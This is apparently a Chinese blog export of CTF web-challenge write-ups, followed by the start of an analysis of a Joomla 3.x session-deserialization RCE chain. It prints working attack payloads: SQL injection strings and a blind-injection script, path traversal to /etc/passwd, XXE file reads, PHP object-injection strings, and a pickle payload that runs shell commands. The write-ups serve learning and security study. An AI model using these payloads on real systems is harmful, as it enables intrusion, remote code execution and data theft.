1unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion";s:8:"CtrlCase";O:12:"UpdateHelper":3:&#123;s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:&#123;s:2:"id";N;s:3:"age";s:45:"select password,id from user where username=?";s:8:"nickname";O:4:"Info":3:&#123;s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":2:&#123;s:4:"name";s:5:"admin";s:5:"token";s:5:"admin";&#125;&#125;&#125;&#125; 在upload.php中传入执行，来查询admin的密码 MD5解一下后拿出密码明文，登陆后就可以拿到flag]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[积累的一些web题目]]></title>
    <url>%2F2019%2F12%2F30%2F%E7%A7%AF%E7%B4%AF%E7%9A%84%E4%B8%80%E4%BA%9Bweb%E9%A2%98%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[[GXYCTF2019]BabySQli 考点：SQL注入 题目界面 随便输入用户名和密码后查看源码得到提示 1MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5 解开为 1select * from user where username = '$name' 我们需要以admin的身份登陆，可以使用union查询，控制为任意密码 virink_2019_files_share 考点：文件读取绕过 题目界面 查看源代码可以看到存在uploads目录 下载时抓包，发现可能存在任意文件读取，测试后发现将../替换为空，这里使用双写绕过即可 1....//....//....//....//....//....//....//etc..//passwd [CSAWQual 2019]Web_Unagi 考点：xxe 题目界面 题目是想让我们上传与示例相符的xml文件，不难联想到xxe，在测试时发现某些关键字被过滤了，借鉴这篇文章 https://xz.aliyun.com/t/4059 可以用utf-16编码来绕过，使用UltraEdit软件来编写utf-16的payload 1234567891011121314151617181920&lt;?xml version='1.0' encoding="utf-16"?&gt;&lt;!DOCTYPE message[ &lt;!ELEMENT message ANY &gt; &lt;!ENTITY % NUMBER '&lt;!ENTITY &amp;#x25; file SYSTEM "file:///flag"&gt; &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///yemoli/&amp;#x25;file;&amp;#x27;&gt;"&gt;&amp;#x25;eval;&amp;#x25;error;'&gt;%NUMBER;]&gt; &lt;users&gt; &lt;user&gt; &lt;username&gt;aaa&lt;/username&gt; &lt;password&gt;qqq&lt;/password&gt; &lt;name&gt;bbb&lt;/name&gt; &lt;email&gt;a@qq.com&lt;/email&gt; &lt;group&gt;CSAW2019&lt;/group&gt; &lt;message&gt;a&lt;/message&gt; &lt;/user&gt;&lt;/users&gt; 按照正常方式发现回显位有长度限制，所以这里用到了与[GoogleCTF2019 Quals]Bnv中一样的利用报错带出数据的方法 [GoogleCTF2019 Quals]Bnv 考点：xxe 题目界面： 该题目主要考点是xxe在无法加载外部dtd时错误数据的带出，参考下面这篇文章 https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/ payload: 1234567891011&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE message[ &lt;!ELEMENT message ANY &gt; &lt;!ENTITY % NUMBER '&lt;!ENTITY &amp;#x25; file SYSTEM "file:///flag"&gt; &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///yemoli/&amp;#x25;file;&amp;#x27;&gt;"&gt;&amp;#x25;eval;&amp;#x25;error;'&gt;%NUMBER;]&gt; &lt;message&gt;a&lt;/message&gt; [HarekazeCTF2019]Easy Notes 考点：session伪造 题目界面 登陆后可以添加note,然后以压缩文件形式下载下来，当访问flag页面时提示我们需要成为admin，审计源码，会发现session和压缩文件存储在同一路径下，看一下压缩文件的命名 由用户名，-，八个随机串，和后缀构成，这个时候就给了我们伪造session的机会 以用户名sess_登陆，然后添加note，title为|N;admin|b:1;，body随意，在下载时将type改为.，这样就得到了伪造的session名称，替换一下即可 [RCTF2015]EasySQL 考点：二次注入 题目界面 在changepwd.php处存在二次注入利用点，可利用报错函数带出数据 放上一个用户名的payload 11mio"||(extractvalue(1,concat(0x5c,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('f'))))))# 注入过程 123456789101112select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())article,flag,usersselect(group_concat(column_name))from(information_schema.columns)where(table_name='users')name,pwd,email,real_flag_1s_hereselect(real_flag_1s_here)from(users)where(name='admin')(real_flag_1s_here)regexp('f')reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('f'))) 由于最后带出flag的时候，报错函数存在回显长度限制，可以使用reverse函数逆序输出，拼接得到完整的结果 [极客大挑战 2019]FinalSQL 考点：SQL盲注 题目界面 题目注入点在search.php?id=1当id=1=0和id=1=1时会有不同结果返回，脚本如下 1234567891011121314151617import requestsimport timeurl = "http://5d1768ad-6d8d-462b-96c1-5c28f6edb4fc.node3.buuoj.cn/search.php?id=1="s = requests.session()result = ""dict_sql = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@#$%^&amp;*/()_-+=&#123;&#125;.:,'for i in range(1,2000): print('====================================') for j in dict_sql: time.sleep(0.1) payload = "((ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1)))=&#123;&#125;)".format(i,ord(j)) url1 = url+payload html = s.get(url1,timeout=5) if 'Click others~~~' in html.text: result = result+j print(result) break 数据 123456789select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')F1naI1y,Flaaaaagselect(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')id,username,passwordselect(group_concat(password))from(F1naI1y) [安洵杯 2019]不是文件上传 考点:SQL注入，反序列化 题目界面 根据题目首页面泄露的信息，在GitHub上找到了该站点源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495//helper.php&lt;?phpclass helper &#123; protected $folder = "pic/"; protected $ifview = False; protected $config = "config.txt"; // The function is not yet perfect, it is not open yet. public function upload($input="file") &#123; $fileinfo = $this-&gt;getfile($input); $array = array(); $array["title"] = $fileinfo['title']; $array["filename"] = $fileinfo['filename']; $array["ext"] = $fileinfo['ext']; $array["path"] = $fileinfo['path']; $img_ext = getimagesize($_FILES[$input]["tmp_name"]); $my_ext = array("width"=&gt;$img_ext[0],"height"=&gt;$img_ext[1]); $array["attr"] = serialize($my_ext); $id = $this-&gt;save($array); if ($id == 0)&#123; die("Something wrong!"); &#125; echo "&lt;br&gt;"; echo "&lt;p&gt;Your images is uploaded successfully. And your image's id is $id.&lt;/p&gt;"; &#125; public function getfile($input) &#123; if(isset($input))&#123; $rs = $this-&gt;check($_FILES[$input]); &#125; return $rs; &#125; public function check($info) &#123; $basename = substr(md5(time().uniqid()),9,16); $filename = $info["name"]; $ext = substr(strrchr($filename, '.'), 1); $cate_exts = array("jpg","gif","png","jpeg"); if(!in_array($ext,$cate_exts))&#123; die("&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;"); &#125; $title = str_replace(".".$ext,'',$filename); return array('title'=&gt;$title,'filename'=&gt;$basename.".".$ext,'ext'=&gt;$ext,'path'=&gt;$this-&gt;folder.$basename.".".$ext); &#125; public function save($data) &#123; if(!$data || !is_array($data))&#123; die("Something wrong!"); &#125; $id = $this-&gt;insert_array($data); return $id; &#125; public function insert_array($data) &#123; $con = mysqli_connect("127.0.0.1","root","root","pic_base"); if (mysqli_connect_errno($con)) &#123; die("Connect MySQL Fail:".mysqli_connect_error()); &#125; $sql_fields = array(); $sql_val = array(); foreach($data as $key=&gt;$value)&#123; $key_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $key); $value_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $value); $sql_fields[] = "`".$key_temp."`"; $sql_val[] = "'".$value_temp."'"; &#125; $sql = "INSERT INTO images (".(implode(",",$sql_fields)).") VALUES(".(implode(",",$sql_val)).")"; mysqli_query($con, $sql); $id = mysqli_insert_id($con); mysqli_close($con); return $id; &#125; public function view_files($path)&#123; if ($this-&gt;ifview == False)&#123; return False; //The function is not yet perfect, it is not open yet. &#125; $content = file_get_contents($path); echo $content; &#125; function __destruct()&#123; # Read some config html $this-&gt;view_files($this-&gt;config); &#125;&#125;?&gt; 1234567891011121314151617181920212223242526272829303132333435363738394041424344//show.php&lt;?phpinclude("./helper.php");$show = new show();if($_GET["delete_all"])&#123; if($_GET["delete_all"] == "true")&#123; $show-&gt;Delete_All_Images(); &#125;&#125;$show-&gt;Get_All_Images();class show&#123; public $con; public function __construct()&#123; $this-&gt;con = mysqli_connect("127.0.0.1","root","root","pic_base"); if (mysqli_connect_errno($this-&gt;con))&#123; die("Connect MySQL Fail:".mysqli_connect_error()); &#125; &#125; public function Get_All_Images()&#123; $sql = "SELECT * FROM images"; $result = mysqli_query($this-&gt;con, $sql); if ($result-&gt;num_rows &gt; 0)&#123; while($row = $result-&gt;fetch_assoc())&#123; if($row["attr"])&#123; $attr_temp = str_replace('\0\0\0', chr(0).'*'.chr(0), $row["attr"]); $attr = unserialize($attr_temp); &#125; echo "&lt;p&gt;id=".$row["id"]." filename=".$row["filename"]." path=".$row["path"]."&lt;/p&gt;"; &#125; &#125;else&#123; echo "&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;"; &#125; mysqli_close($this-&gt;con); &#125; public function Delete_All_Images()&#123; $sql = "DELETE FROM images"; $result = mysqli_query($this-&gt;con, $sql); &#125;&#125;?&gt; 1234567891011121314151617181920//upload.php&lt;?phpinclude("./helper.php");class upload extends helper &#123; public function upload_base()&#123; $this-&gt;upload(); &#125;&#125;if ($_FILES)&#123; if ($_FILES["file"]["error"])&#123; die("Upload file failed."); &#125;else&#123; $file = new upload(); $file-&gt;upload_base(); &#125;&#125;$a = new helper();?&gt; 存在一处注入点 helper.php上部分未对title进行过滤，可以在图中红线部分进行insert注入，抽象出来的语句 1insert into images (`title`,`filename`,`ext`,`path`,`attr`) values ('a','b','c','d','e') a是我们可控的，同时在show.php中发现了反序列化的触发点 该处是针对语句中的e进行反序列化操作，通过注入我们可以控制e处序列化的字符串，利用代码 12345678910111213141516171819202122&lt;?phpclass helper &#123; protected $config = "/flag"; protected $ifview = 1; // The function is not yet perfect, it is not open yet. public function view_files($path)&#123; if ($this-&gt;ifview == False)&#123; return False; //The function is not yet perfect, it is not open yet. &#125; $content = file_get_contents($path); echo $content; &#125; function __destruct()&#123; # Read some config html $this-&gt;view_files($this-&gt;config); &#125;&#125;$a = new helper;echo serialize($a); 然后将%00*%00替换为\\0\\0\\0，因为代码中存在该处替换 1O:6:"helper":2:&#123;s:9:"\\0\\0\\0config";s:5:"/flag";s:9:"\\0\\0\\0ifview";i:1;&#125; 因为文件名中不可以有：&quot;等字符，把该段转化成16进制，最后文件名为 1a','b','c','d',0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b733a393a225c305c305c30696676696577223b693a313b7d)# [CISCN2019 华北赛区 Day1 Web5]CyberPunk题目界面 用伪协议读一下源码 1?file=php://filter/convert.base64-encode/resource=index.php 重点代码 1234567891011121314151617181920212223242526272829303132333435363738//confirm.php&lt;?phprequire_once "config.php";//var_dump($_POST);if(!empty($_POST["user_name"]) &amp;&amp; !empty($_POST["address"]) &amp;&amp; !empty($_POST["phone"]))&#123; $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST["user_name"]; $address = $_POST["address"]; $phone = $_POST["phone"]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = 'no sql inject!'; &#125;else&#123; $sql = "select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"; $fetch = $db-&gt;query($sql); &#125; if($fetch-&gt;num_rows&gt;0) &#123; $msg = $user_name."已提交订单"; &#125;else&#123; $sql = "insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)"; $re = $db-&gt;prepare($sql); $re-&gt;bind_param("sss", $user_name, $address, $phone); $re = $re-&gt;execute(); if(!$re) &#123; echo 'error'; print_r($db-&gt;error); exit; &#125; $msg = "订单提交成功"; &#125;&#125; else &#123; $msg = "信息不全";&#125;?&gt; 1234567891011121314151617181920212223242526272829303132333435//change.php&lt;?phprequire_once "config.php";if(!empty($_POST["user_name"]) &amp;&amp; !empty($_POST["address"]) &amp;&amp; !empty($_POST["phone"]))&#123; $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST["user_name"]; $address = addslashes($_POST["address"]); $phone = $_POST["phone"]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = 'no sql inject!'; &#125;else&#123; $sql = "select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"; $fetch = $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row = $fetch-&gt;fetch_assoc(); $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id']; $result = $db-&gt;query($sql); if(!$result) &#123; echo 'error'; print_r($db-&gt;error); exit; &#125; $msg = "订单修改成功"; &#125; else &#123; $msg = "未找到订单!"; &#125;&#125;else &#123; $msg = "信息不全";&#125;?&gt; 其中输入的时候confirm.php未对address进行过滤，只是进行了addslashes处理，这样配合修改功能，就可以造成二次注入，可使用报错函数updatexml，payload如下 11' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,20)),0x7e),1)# 当更新地址时，该句会出现错误带出数据 1"update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'] [强网杯 2019]随便注题目界面 该题目考察堆叠注入相关知识，其中有如下过滤 12return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);strstr($inject, "set") &amp;&amp; strstr($inject, "prepare") 进行注入 1?inject=1';show databases; 1?inject=1';use supersqli;show tables; 1?inject=1';show columns from words; 1?inject=1';show columns from `1919810931114514`; 现在基本上清楚了数据库中表的结构，由于不能使用select，这里使用alter将words表换成1919810931114514，然后添加id字段，同时将flag字段改名为data字段，这样通过查询就可以直接拿到flag,语句如下 1ALTER TABLE words RENAME TO moli;ALTER TABLE `1919810931114514` RENAME TO words;ALTER TABLE words ADD id CHAR(10) DEFAULT '1';ALTER TABLE words CHANGE flag data BIGINT; 直接查询 [GWCTF 2019]枯燥的抽奖 考点：伪随机数 题目界面 控制台查看网络来到check.php，代码如下 12345678910111213141516171819202122232425262728&lt;?php#这不是抽奖程序的源代码！不许看！header("Content-Type: text/html;charset=utf-8");session_start();if(!isset($_SESSION['seed']))&#123;$_SESSION['seed']=rand(0,999999999);&#125;mt_srand($_SESSION['seed']);$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123; $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125;$str_show = substr($str, 0, 10);echo "&lt;p id='p1'&gt;".$str_show."&lt;/p&gt;";if(isset($_POST['num']))&#123; if($_POST['num']===$str)&#123;x echo "&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"; &#125; else&#123; echo "&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"; &#125;&#125;show_source("check.php"); 这是个经典的伪随机数问题，可以参考该文章：https://www.freebuf.com/vuls/192012.html 将得到的部分字母还原成随机数 123456789101112&lt;?php$pass_now = "W0dCwtjQ3A";$allowable_characters = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';$len = strlen($allowable_characters) - 1;for ($j = 0; $j &lt; strlen($pass_now); $j++) &#123; for ($i = 0; $i &lt; $len; $i++) &#123; if ($pass_now[$j] == $allowable_characters[$i]) &#123; echo "$i $i 0 $len "; break; &#125; &#125;&#125; 爆破种子 得到了在7.1版本下的种子，然后对完整的字符串进行还原，注意要在7.1版本下运行代码 12345678910&lt;?phpmt_srand(237387795);$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123; $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125;echo $str; [HarekazeCTF2019]encode_and_encode题目界面 重点源码 1234567891011121314151617181920212223242526272829303132333435363738394041//query.php&lt;?phperror_reporting(0);if (isset($_GET['source'])) &#123; show_source(__FILE__); exit();&#125;function is_valid($str) &#123; $banword = [ // no path traversal '\.\.', // no stream wrapper '(php|file|glob|data|tp|zip|zlib|phar):', // no data exfiltration 'flag' ]; $regexp = '/' . implode('|', $banword) . '/i'; if (preg_match($regexp, $str)) &#123; return false; &#125; return true;&#125;$body = file_get_contents('php://input');$json = json_decode($body, true);if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json['page'])) &#123; $page = $json['page']; $content = file_get_contents($page); if (!$content || !is_valid($content)) &#123; $content = "&lt;p&gt;not found&lt;/p&gt;\n"; &#125;&#125; else &#123; $content = '&lt;p&gt;invalid request&lt;/p&gt;';&#125;// no data exfiltration!!!$content = preg_replace('/HarekazeCTF\&#123;.+\&#125;/i', 'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;', $content);echo json_encode(['content' =&gt; $content]); 我们需要以json的格式传入想读的文件名，但存在is_valid函数进行安全检查，这里可使用unicode进行绕过，同时为了避免文件内容有拦截，可以进行编码，例如 1&#123;"page":"php\u003a//filter/convert.base64-encode/resource=/fl\u0061g"&#125; 在线转换 http://tool.chinaz.com/tools/unicode.aspx [CISCN2019 华北赛区 Day1 Web2]ikun 考点：jwt伪造，pickle 题目界面 首先要我们购买lv6，开始寻找lv6所在页面，脚本如下 12345678910111213141516import requestsimport timeurl = "http://6664045a-dfa6-4a6c-9ffb-bb0cd3a6a5d2.node3.buuoj.cn/shop?page="s = requests.session()for i in range(1,999): url1 = url + str(i) print('=================================') try: html = s.get(url1) print(html.status_code) if "lv6.png" in html.text: print(url1) break except: print('[-]ERROR') time.sleep(0.1) 发现在181页，购买时发现账户中的金额不足，抓包去修改折扣数值，将其改小一些，例如0.0000001，购买后提示我们不是admin，进而查看当前cookie，发现是jwt，拿出来爆破一下密钥 将cookie替换，查看源码，给了源码泄露的地址，下载下来审计一下，发现了反序列化的点 12345678910import pickleimport urllibclass payload(object): def __reduce__(self): #return (eval, ("open('/flag.txt','r').read()",)) return (eval,("__import__('os').popen('cat /flag.txt').read()",))a = pickle.dumps(payload())a = urllib.quote(a)print a]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[joomla3.4.6-rce分析]]></title>
    <url>%2F2019%2F10%2F15%2Fjoomla3-4-6-rce%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[前言前段时间意大利安全研究员Alessandro Groppo 公开了joomla3.0.0-3.4.6的漏洞详情，今天借此机会复现分析一下 原理分析漏洞根本上来说是源于session的反序列化，在joomla中有一套自己的session处理机制，当产生会话的时候，joomla会将序列化后的数据存储在数据库中，然后将数据从数据库中取出来进行反序列化 写函数: \libraries\joomla\session\storage\database.php 12345678910111213141516171819202122232425262728293031323334353637383940414243/** * Write session data to the SessionHandler backend. * * @param string $id The session identifier. * @param string $data The session data. * * @return boolean True on success, false otherwise. * * @since 11.1 */ public function write($id, $data) &#123; // Get the database connection object and verify its connected. $db = JFactory::getDbo(); $data = str_replace(chr(0) . '*' . chr(0), '\0\0\0', $data); try &#123; $query = $db-&gt;getQuery(true) -&gt;update($db-&gt;quoteName('#__session')) -&gt;set($db-&gt;quoteName('data') . ' = ' . $db-&gt;quote($data)) -&gt;set($db-&gt;quoteName('time') . ' = ' . $db-&gt;quote((int) time())) -&gt;where($db-&gt;quoteName('session_id') . ' = ' . $db-&gt;quote($id)); // Try to update the session data in the database table. $db-&gt;setQuery($query); if (!$db-&gt;execute()) &#123; return false; &#125; /* Since $db-&gt;execute did not throw an exception, so the query was successful. Either the data changed, or the data was identical. In either case we are done. */ return true; &#125; catch (Exception $e) &#123; return false; &#125; &#125; 读函数：\libraries\joomla\session\storage\database.php 1234567891011121314151617181920212223242526272829303132333435/** * Read the data for a particular session identifier from the SessionHandler backend. * * @param string $id The session identifier. * * @return string The session data. * * @since 11.1 */ public function read($id) &#123; // Get the database connection object and verify its connected. $db = JFactory::getDbo(); try &#123; // Get the session data from the database table. $query = $db-&gt;getQuery(true) -&gt;select($db-&gt;quoteName('data')) -&gt;from($db-&gt;quoteName('#__session')) -&gt;where($db-&gt;quoteName('session_id') . ' = ' . $db-&gt;quote($id)); $db-&gt;setQuery($query); $result = (string) $db-&gt;loadResult(); $result = str_replace('\0\0\0', chr(0) . '*' . chr(0), $result); return $result; &#125; catch (Exception $e) &#123; return false; &#125; &#125; 其中，在write函数中 1$data = str_replace(chr(0) . '*' . chr(0), '\0\0\0', $data); 会将/x00*/x00 替换为 \0\0\0 ,因为protected修饰的变量在序列化后会带有/x00*/x00 而mysql中无法对NULL值进行存储，所以会对该处进行替换 为了保持数据完整性自然会在read函数中将/x00*/x00替换回来，就是下面这句 1$result = str_replace('\0\0\0', chr(0) . '*' . chr(0), $result); 到这里就会出现一个问题，如果写入的反序列化字符串存在/0/0/0，当read函数读取的时候，就会将其替换成\x00*\x00这样输入的字符串就少了三个字符，如下程序 1234&lt;?php$result = 'admin\0\0\0admin';$result = str_replace('\0\0\0', chr(0) . '*' . chr(0), $result);echo $result; 该段输出为adminN*Nadmin，很轻易看出少了三个字符，这样在session反序列化时由于前面声明的字符串长度并未改变，所以会吃掉后面的三个字符，这样我们就可以通过这个利用点将两处反序列化中间的字段吃掉，使第二部分内容逃出来进行反序列化。 POP链构造起始触发点为 /libraries/joomla/database/driver/mysqli.php中的__destruct()函数 123public function __destruct()&#123; $this-&gt;disconnect(); &#125; 跟进disconnect(); 12345678910public function disconnect() &#123; // Close the connection. if ($this-&gt;connection) &#123; foreach ($this-&gt;disconnectHandlers as $h) &#123; call_user_func_array($h, array(&amp;$this)); &#125; mysqli_close($this-&gt;connection); &#125; $this-&gt;connection = null;&#125; 需要满足$this-&gt;connection为true ，这里注意到 call_user_func_array($h, array(&amp;$this)); 其中第二个参数无法控制，所以我们无法在此处实现assert的回调执行，于是来寻找其他类是否有可以利用的的方法。 这里找到了SimplePie类的init方法，路径为/libraries/simplepie/simplepie.php，主要代码 1234567891011121314if ($this-&gt;feed_url !== null || $this-&gt;raw_data !== null) &#123; $this-&gt;data = array(); $this-&gt;multifeed_objects = array(); $cache = false; if ($this-&gt;feed_url !== null) &#123; $parsed_feed_url = SimplePie_Misc::parse_url($this-&gt;feed_url); // Decide whether to enable caching if ($this-&gt;cache &amp;&amp; $parsed_feed_url['scheme'] !== '') &#123; $cache = call_user_func(array($this-&gt;cache_class, 'create'), $this-&gt;cache_location, call_user_func($this-&gt;cache_name_function, $this-&gt;feed_url), 'spc'); &#125; 这里我们可以控制call_user_func($this-&gt;cache_name_function, $this-&gt;feed_url)的两个参数，这样就可以使用assert函数回调进行任意代码执行，同时这里需要满足上面的几个if条件 目前找到了执行任意命令的路径，最后一个问题就是joomla默认是没有载入SimplePie类的，所以这里使用了JSimplepieFactory类，该类在加载时会自动将SimplePie类导入当前环境，关键语句 1jimport('simplepie.simplepie'); if处最难bypass的是$parsed_feed_url[&#39;scheme&#39;] !== &#39;&#39;，这里考虑用分割符形如 code||$m=&#39;http://yemoli.top&#39; 测试代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753&lt;?phperror_reporting(E_ERROR); ini_set("display_errors","Off");class SimplePie_IRI&#123; /** * Scheme * * @access private * @var string */ var $scheme; /** * User Information * * @access private * @var string */ var $userinfo; /** * Host * * @access private * @var string */ var $host; /** * Port * * @access private * @var string */ var $port; /** * Path * * @access private * @var string */ var $path; /** * Query * * @access private * @var string */ var $query; /** * Fragment * * @access private * @var string */ var $fragment; /** * Whether the object represents a valid IRI * * @access private * @var array */ var $valid = array(); /** * Return the entire IRI when you try and read the object as a string * * @access public * @return string */ function __toString() &#123; return $this-&gt;get_iri(); &#125; /** * Create a new IRI object, from a specified string * * @access public * @param string $iri * @return SimplePie_IRI */ function SimplePie_IRI($iri) &#123; $iri = (string) $iri; if ($iri !== '') &#123; $parsed = $this-&gt;parse_iri($iri); $this-&gt;set_scheme($parsed['scheme']); $this-&gt;set_authority($parsed['authority']); $this-&gt;set_path($parsed['path']); $this-&gt;set_query($parsed['query']); $this-&gt;set_fragment($parsed['fragment']); &#125; &#125; /** * Create a new IRI object by resolving a relative IRI * * @static * @access public * @param SimplePie_IRI $base Base IRI * @param string $relative Relative IRI * @return SimplePie_IRI */ function absolutize($base, $relative) &#123; $relative = (string) $relative; if ($relative !== '') &#123; $relative = new SimplePie_IRI($relative); if ($relative-&gt;get_scheme() !== null) &#123; $target = $relative; &#125; elseif ($base-&gt;get_iri() !== null) &#123; if ($relative-&gt;get_authority() !== null) &#123; $target = $relative; $target-&gt;set_scheme($base-&gt;get_scheme()); &#125; else &#123; $target = new SimplePie_IRI(''); $target-&gt;set_scheme($base-&gt;get_scheme()); $target-&gt;set_userinfo($base-&gt;get_userinfo()); $target-&gt;set_host($base-&gt;get_host()); $target-&gt;set_port($base-&gt;get_port()); if ($relative-&gt;get_path() !== null) &#123; if (strpos($relative-&gt;get_path(), '/') === 0) &#123; $target-&gt;set_path($relative-&gt;get_path()); &#125; elseif (($base-&gt;get_userinfo() !== null || $base-&gt;get_host() !== null || $base-&gt;get_port() !== null) &amp;&amp; $base-&gt;get_path() === null) &#123; $target-&gt;set_path('/' . $relative-&gt;get_path()); &#125; elseif (($last_segment = strrpos($base-&gt;get_path(), '/')) !== false) &#123; $target-&gt;set_path(substr($base-&gt;get_path(), 0, $last_segment + 1) . $relative-&gt;get_path()); &#125; else &#123; $target-&gt;set_path($relative-&gt;get_path()); &#125; $target-&gt;set_query($relative-&gt;get_query()); &#125; else &#123; $target-&gt;set_path($base-&gt;get_path()); if ($relative-&gt;get_query() !== null) &#123; $target-&gt;set_query($relative-&gt;get_query()); &#125; elseif ($base-&gt;get_query() !== null) &#123; $target-&gt;set_query($base-&gt;get_query()); &#125; &#125; &#125; $target-&gt;set_fragment($relative-&gt;get_fragment()); &#125; else &#123; // No base URL, just return the relative URL $target = $relative; &#125; &#125; else &#123; $target = $base; &#125; return $target; &#125; /** * Parse an IRI into scheme/authority/path/query/fragment segments * * @access private * @param string $iri * @return array */ function parse_iri($iri) &#123; preg_match('/^(([^:\/?#]+):)?(\/\/([^\/?#]*))?([^?#]*)(\?([^#]*))?(#(.*))?$/', $iri, $match); for ($i = count($match); $i &lt;= 9; $i++) &#123; $match[$i] = ''; &#125; return array('scheme' =&gt; $match[2], 'authority' =&gt; $match[4], 'path' =&gt; $match[5], 'query' =&gt; $match[7], 'fragment' =&gt; $match[9]); &#125; /** * Remove dot segments from a path * * @access private * @param string $input * @return string */ function 